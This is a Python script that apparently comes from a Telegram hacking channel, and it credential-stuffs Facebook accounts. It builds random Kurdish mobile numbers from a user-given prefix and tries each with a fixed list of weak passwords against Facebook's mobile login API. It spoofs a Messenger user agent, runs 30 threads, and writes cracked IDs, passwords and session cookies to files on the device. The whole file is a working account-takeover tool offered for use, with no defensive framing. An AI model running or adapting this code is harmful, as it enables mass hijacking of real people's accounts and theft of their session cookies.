#coding :- utf-8
#update by :- MR,VEAR
#Script Owner : MR,VEAR
#---------------------
try:
	import os,requests,time,re,random,sys,uuid,string,json,subprocess,base64,zlib,hashlib
	from string import *
	from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError: 
	os.system('pip install requests > /dev/null')
	exit('\n Run Again ')
logo ='''

\033[1;97m--------------------------------------------------
\033[1;91m Author      : MaMa_HaMa
\033[1;91m Telegram    : https://t.me/MaMa_HaMa_Hack
\033[1;91m Status      : FREE
\033[1;97m--------------------------------------------------
'''
loop = 0
oks = []
pcp=[]
cps=[]
#---------------------MKING-MENU---------------------#
def menu():
	os.system('clear')
	print(logo)
	print('[1] CRACK RANDOM (VIP) ')
	print('[0] DARCHUN (Exit Menu)')
	print(47*'-')
	opt = input('[?] HalBzhera : ')
	if opt =='1':
		afg_randome()
	elif opt =='0':
		menu()
	else:
		print('\033[1;91m [•] HalBzhera\033[0;97m')
#---------------------MKING-RANDOM_CRACK---------------------#
def afg_randome():
	user=[]
	os.system('clear')
	print(logo)
	print('[+] Cod Kurdstan (0750,,0751,0770)....')
	print(47*'-')
	kode = input('[?] Halbzhera : ')
	print(47*'-')
	limit = int('99999')
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with tred(max_workers=30) as ahd:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('\x1b[1;91m[\x1b[1;92m+\x1b[1;91m] \x1b[1;96mHAMU IDS : \033[1;92m'+tl)
		print('\x1b[1;91m[\x1b[1;92m✔\x1b[1;91m] \x1b[1;93mRawsta Ta 15 Daqa Wa Crack Akam...\x1b[1;91m(\033[1;92mCOMING SOON UPDATE \033[1;91m)')
		print('\x1b[1;91m[\x1b[1;92m✔\x1b[1;91m] \x1b[1;94mBo Wastandne Toolka Ctrl Z Dabgra \033[1;91m)');print(47*'-')
		for guru in user:
			ids = kode+guru
			mking_pass = [ids,guru,'hamahama','۱۲۳۴۵۶۷۸۹','hama1234','hama12345','zaxozaxo','zaxo1234','zaxo12345','kurdkurd','kurd1234','0987654321',]
			ahd.submit(rndm,ids,mking_pass)
	print(47*'\n\033[1;37m-')
	print('[✓] Crack process has been completed')
	print('[?] Total Ok Id Save in  /sdcard/HAMA-OK.txt')
	print('[?] Total Cp Id Save in  /sdcard/HAMA-CP.txt')
	print(47*'-')
	print(' Press Inter To Back Menu')
#---------------------START-CRACK---------------------#
def rndm(ids,mking_pass):
	try:
		global ok,loop
		sys.stdout.write('\r\r\033[1;37m [MR,VEAR-CRACK] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in mking_pass:
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(111111111,999999999))
			android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
			model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
			build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
			fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
			fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
			ua = 'Dalvik/2.1.0 (Linux; U; Android '+android_version+'; '+model+' Build/'+build+') [FBAN/Orca-Android;FBAV/'+fbav+';FBBV/'+fbbv+';FBRV/0;FBPN/com.facebook.orca;FBLC/en_US;FBMF/'+fbmf+';FBBD/'+fbbd+';FBDV/'+model+';FBSV/'+android_version+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density='+str(random.randint(1,9))+'.'+str(random.randint(1,9))+',width='+str(random.randint(500,999))+',height='+str(random.randint(999,1999))+'};FB_FW/1;]'
			data ={"locale": "en_GB","format": "json","email": ids,"password": pas,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies": 1}
			head = {
   "path": '/',
   "scheme": 'https',
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"M2102J20SG"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',}
			po = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=head).json()
			if 'session_key' in po:
				uid = po['uid']
				coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
				print('\r\r\033[1;32m [MR,VEAR-OK] '+str(uid)+' | '+pas+'\033[1;97m')
				print('\r\r\033[1;32m [COOKIES] %s   '%(coki))
				open('/sdcard/MR,VEAR-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
				oks.append(str(uid))
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = po['error']['error_data']['uid']
				print('\r\r\x1b[1;33m [MR,VEAR-CP] '+str(uid)+' | '+pas+'\033[1;97m')
				open('/sdcard/MR,VEAR-CP.txt','a').write(str(uid)+'|'+pas+'\n')
				cps.append(str(uid))
				break
			else:continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass
menu()
